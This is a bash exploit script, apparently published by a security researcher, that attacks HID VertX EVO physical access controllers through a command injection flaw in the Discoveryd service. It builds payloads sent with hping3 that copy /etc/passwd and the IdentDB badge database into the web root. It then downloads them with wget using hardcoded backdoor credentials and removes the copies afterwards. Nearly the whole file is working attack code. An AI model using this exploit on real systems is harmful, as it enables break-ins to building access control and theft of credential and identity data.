#!/bin/bash
#################################################################################
# Writen by Mike Kelly                                                          #
# twitter.com/lixmk                                                             #
# github.com/lixmk                                                              #
# exfil.co                                                                      #
#                                                                               #
#	###########################################################             #
#	#    HID Discoveryd Data Exfil tool for the VertX EVO     #             #
#	#                                                         #             #
#	#    Copies files to web root using the HID Discoveryd    #             #
#	#     remote command injection vulnerability and wgets    #             #
#	###########################################################             #
#                                                                               #
#	This program is free software: you can redistribute it and/or modify    #
#	it under the terms of the GNU General Public License as published by    #
#	the Free Software Foundation, either version 3 of the License, or       #
#	at your option) any later version.                                      #
#                                                                               #
#	This program is distributed in the hope that it will be useful,         #
#	but WITHOUT ANY WARRANTY; without even the implied warranty of          #
#	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
#	GNU General Public License for more details.                            #
#                                                                               #
#	You should have received a copy of the GNU General Public License       #
#	along with this program.  If not, see <http://www.gnu.org/licenses/>.   #
#                                                                               #
#################################################################################

echo -e "\e[1;31m############################################################\e[0m"
echo -e "\e[1;31m#\e[0m                                                          \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m  This script will copy sensitive files to the web root   \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m        of the VertX EVO then extracts using wget.        \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m                Requires VertX-exploit.sh                 \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m                                                          \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m            Variables need to be set manually             \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m    CTRL-C now to set vars or press ENTER to continue.    \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m                                                          \e[1;31m#\e[0m"
echo -e "\e[1;31m############################################################\e[0m"
read -e NULL

# Set the follwoing 3 variables
TARGET='192.168.5.154'
TMAC='00:06:8E:02:54:F2'
# 

CMDEXEC=`which hping3`

echo "[*] Creating Data files"
echo 'command_blink_on;044;'${TMAC}';1`cp /etc/passwd /mnt/apps/web/`;' > data1.txt
echo 'command_blink_on;044;'${TMAC}';1`ln -s /mnt/apps/data/config/IdentDB /idb`;' > data2.txt
echo 'command_blink_on;044;'${TMAC}';1`cp /idb /mnt/apps/web/`;' > data3.txt
echo 'command_blink_on;044;'${TMAC}';1`rm /idb /mnt/apps/web/idb`;' > data4.txt
echo 'command_blink_on;044;'${TMAC}';1`rm /mnt/apps/web/passwd`;' > data5.txt
echo "[*] Data files created"
echo "[*] Executing"

# Copying /etc/shadow to web root for exfil
echo "[*] Sending Payload 1"
${CMDEXEC} -2 -p 4070 -c 1 -E data1.txt -d 150 ${TARGET} 2> /dev/null
echo ""

# Payload 2 and 3 copy IdentDB to web root for exfil
echo "[*] Sending Payload 2"
${CMDEXEC} -2 -p 4070 -c 1 -E data2.txt -d 150 ${TARGET} 2> /dev/null
echo ""

echo "[*] Sending Payload 3"
${CMDEXEC} -2 -p 4070 -c 1 -E data3.txt -d 150 ${TARGET} 2> /dev/null
echo ""

#Depending on size of this IdentDB file, you may need to wait longer to for the copy before wget'ing
sleep 2

#Exfil'ing copy'd files
wget --user=z --password=backdoor -O idb http://${TARGET}/idb 
wget --user=z --password=backdoor -O passwd http://${TARGET}/passwd

echo "Exfil Complete - Cleaning up target"

echo "[*] Sending Payload 4"
${CMDEXEC} -2 -p 4070 -c 1 -E data4.txt -d 150 ${TARGET} 2> /dev/null
echo ""

echo "[*] Sending Payload 5"
${CMDEXEC} -2 -p 4070 -c 1 -E data5.txt -d 150 ${TARGET} 2> /dev/null
echo ""

echo "[*] All Done"